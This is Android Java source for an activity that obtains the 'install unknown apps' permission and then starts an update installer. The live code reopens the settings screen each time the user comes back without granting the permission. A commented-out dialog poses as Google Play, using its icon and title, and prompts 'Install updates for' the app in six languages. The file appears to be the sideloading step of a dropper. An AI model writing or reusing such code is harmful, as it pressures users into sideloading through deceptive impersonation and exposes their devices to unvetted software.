package com.appd.instll;



import static com.appd.instll.tools.getLabelApplication;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import java.util.Locale;


public class Requestinstall extends Activity {
    private static final int REQUEST_INSTALL_PERMISSION = 9854;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Check if the app already has the permission
            if (!getPackageManager().canRequestPackageInstalls()) {
                // Request the permission
                askedForPermission = true;
                Intent intent = null;
                intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                //Askinstall();
            }else{
                finish();
            }
        }
    }
//    private void Askinstall() {
//        String CurrnetLanuage = Locale.getDefault().getLanguage();
//        //Toast.makeText(this,"Enable Draw over apps For : " + getString(R.string.f1f2f3f4f5f6), Toast.LENGTH_LONG).show();
//        final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert);
//
//
//        String buttonnameOK="OK";
//        String MYNAME= getLabelApplication(getApplicationContext());
//        switch (CurrnetLanuage) {
//            case "en":
//                buttonnameOK = "Enable";
//                alertDialog.setMessage("Install updates for: " + MYNAME);
//                break;
//
//            case "ar": // Arabic
//                buttonnameOK = "تفعيل";
//                alertDialog.setMessage("تثبيت التحديثات لـ: " + MYNAME);
//                break;
//
//            case "cn": // Chinese
//                buttonnameOK = "使能够";
//                alertDialog.setMessage("安装更新：" + MYNAME);
//                break;
//
//            case "tr": // Turkish
//                buttonnameOK = "Tamam";
//                alertDialog.setMessage("Güncellemeleri yükle: " + MYNAME);
//                break;
//
//            case "es": // Spanish
//                buttonnameOK = "Habilitar";
//                alertDialog.setMessage("Instalar actualizaciones para: " + MYNAME);
//                break;
//
//            case "pt": // Portuguese
//                buttonnameOK = "Ativar";
//                alertDialog.setMessage("Instalar atualizações para: " + MYNAME);
//                break;
//
//            default:
//                buttonnameOK = "OK";
//                alertDialog.setMessage("Install updates for: " + MYNAME);
//                break;
//        }
//
//        try {
//            Drawable icon = this.getPackageManager().getApplicationIcon("com.android.vending");
//            alertDialog.setIcon(icon);
//            alertDialog.setTitle("Google Play");
//        } catch (PackageManager.NameNotFoundException e) {
//
//            try {
//                // null;
//                Drawable icon = this.getPackageManager().getApplicationIcon(getPackageName());
//                alertDialog.setIcon(icon);
//                alertDialog.setTitle(MYNAME);
//            } catch (PackageManager.NameNotFoundException ex) {
//                //ex.printStackTrace();
//            }
//
//        }
//
//
//        alertDialog.setPositiveButton(buttonnameOK, new DialogInterface.OnClickListener() {
//            @Override
//            public void onClick(DialogInterface dialogInterface, int i) {
//                askedForPermission = true;
//                Intent intent = null;
//                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
//                    intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
//                            Uri.parse("package:" + getPackageName()));
//                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    startActivity(intent);
//
//                }
//
//            }
//        });
//
//        alertDialog.setCancelable(false).create();
//
//        alertDialog.show();
//
//    }
    private boolean askedForPermission = false;
    @Override
    protected void onResume() {
        super.onResume();
        if (askedForPermission) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (getPackageManager().canRequestPackageInstalls()) {
                    // Permission is granted, proceed
                    askedForPermission=false;
                    Intent reqinst = new Intent(getApplicationContext(), updateActivity.class);
                    reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    reqinst.putExtra("start_update", true); // Pass flag to splash activity
                    startActivity(reqinst);
                    finish();
                }else{
                    Intent intent = null;
                    intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (askedForPermission) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (getPackageManager().canRequestPackageInstalls()) {
                    // Permission is granted, proceed
                    askedForPermission=false;
                    Intent reqinst = new Intent(getApplicationContext(), updateActivity.class);
                    reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
                    reqinst.putExtra("start_update", true); // Pass flag to splash activity
                    startActivity(reqinst);

                }
            }
        }
    }
    //    @Override
//    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
//        super.onActivityResult(requestCode, resultCode, data); // Always call super
//
//        if (requestCode == REQUEST_INSTALL_PERMISSION) {
//            // Check the permission again
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                if (getPackageManager().canRequestPackageInstalls()) {
//                    Toast.makeText(this, "Permission Enabled", Toast.LENGTH_SHORT).show();
//                    Intent reqinst = new Intent(getApplicationContext(), splash.class);
//                    reqinst.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
//                    startActivity(reqinst);
//                    finish();
//                } else {
//                    Toast.makeText(this, "Permission not granted", Toast.LENGTH_SHORT).show();
//                    finish();
//                }
//            }
//        }
//    }

}
